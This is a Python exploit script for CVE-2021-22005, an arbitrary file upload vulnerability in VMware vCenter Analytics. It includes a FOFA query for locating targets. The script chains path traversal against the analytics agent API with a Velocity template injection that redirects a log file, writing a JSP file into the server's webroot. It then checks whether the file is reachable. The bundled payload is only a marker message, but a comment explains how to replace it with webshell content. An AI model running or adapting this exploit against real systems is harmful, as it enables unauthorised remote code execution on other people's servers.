#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import random
import string

from Config.config_proxies import proxies
from Config.config_requests import ua


requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME='CVE-2021-22005'
AUTHOR="境心"
REMARK='VMware vCenter Analytics 任意文件上传漏洞'
FOFA_RULE='title="+ ID_VC_Welcome +"'
######################################################


def id_generate(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def poc_content(filename):
    file_path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % (filename)
    poc_content_part = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<% out.print("this is a friendly test, Please check and repair upload vulnerabilities.");
%>"""
    # 放shell内容,同时注释掉上面的poc_content_part内容
    # poc_content_part = """"""
    poc_content_part_unicode = ""
    for i in poc_content_part:
        asc_chr = ord(i)
        aa = "\\u{:04x}".format(asc_chr)
        poc_content_part_unicode = poc_content_part_unicode + aa

    content = """<manifest recommendedPageSize="500">
       <request>
          <query name="vir:VCenter">
             <constraint>
                <targetType>ServiceInstance</targetType>
             </constraint>
             <propertySpec>
                <propertyNames>content.about.instanceUuid</propertyNames>
                <propertyNames>content.about.osType</propertyNames>
                <propertyNames>content.about.build</propertyNames>
                <propertyNames>content.about.version</propertyNames>
             </propertySpec>
          </query>
       </request>
       <cdfMapping>
          <indepedentResultsMapping>
             <resultSetMappings>
                <entry>
                   <key>vir:VCenter</key>
                   <value>
                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                         <resourceItemToJsonLdMapping>
                            <forType>ServiceInstance</forType>
                         <mappingCode><![CDATA[    
                            #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                            #set($orig_log = $appender.getFile())##
                            #set($logger = $GLOBAL-logger.logger.parent)##     
                            $appender.setFile("%s")##     
                            $appender.activateOptions()##  
                            $logger.warn("%s")##   
                            $appender.setFile($orig_log)##     
                            $appender.activateOptions()##]]>
                         </mappingCode>
                         </resourceItemToJsonLdMapping>
                      </value>
                   </value>
                </entry>
             </resultSetMappings>
          </indepedentResultsMapping>
       </cdfMapping>
       <requestSchedules>
          <schedule interval="1h">
             <queries>
                <query>vir:VCenter</query>
             </queries>
          </schedule>
       </requestSchedules>
    </manifest>""" %(file_path, poc_content_part_unicode)
    return content

def Agent(ver_url):
    headers = {"User-Agent": ua,
               "X-Deployment-Secret": "test"
}

    json_data = { "manifestSpec":{},
                  "objectType": "a2",
                  "collectionTriggerDataNeeded": True,
                  "deploymentDataNeeded":True,
                  "resultNeeded": True,
                  "signalCollectionCompleted":True,
                  "localManifestPath": "a7",
                  "localPayloadPath": "a8",
                  "localObfuscationMapPath": "a9" }
    requests.post(ver_url, headers=headers, json=json_data, verify=False,proxies=proxies)


def poc(target):
    result = {}
    filename = "test5.jsp"
    first_id = id_generate()
    seconde_id = id_generate()
    end_chr = target[-1]
    if end_chr == "/":
        url = target + "analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (first_id,seconde_id)
        poc_url = target + "idm/..;/%s" % (filename)
        ver_url = target + "analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (first_id,seconde_id)
    else:
        url = target + "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (first_id,seconde_id)
        poc_url = target + "/idm/..;/%s" % (filename)
        ver_url = target + "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (first_id,seconde_id)
    Agent(ver_url)
    content = poc_content(filename)
    headers = {"User-Agent": ua,
        "X-Deployment-Secret": "test"
    }
    json_data = {"contextData": "a3", "manifestContent": content, "objectId": "a2"}
    requests.post(url, headers=headers, json=json_data, verify=False, timeout=5,proxies=proxies)
    poc_res = requests.get(url=poc_url, headers=headers, verify=False,proxies=proxies)
    if "this is a friendly test, Please check and repair upload vulnerabilities." in poc_res.text:
        result['poc'] = NAME
        result['poc_url'] = poc_url
        result['message'] = "存在VMware vCenter Analytics 任意文件上传漏洞"
        return result

if __name__ == '__main__':
    # poc调用
    poc("https://127.0.0.1")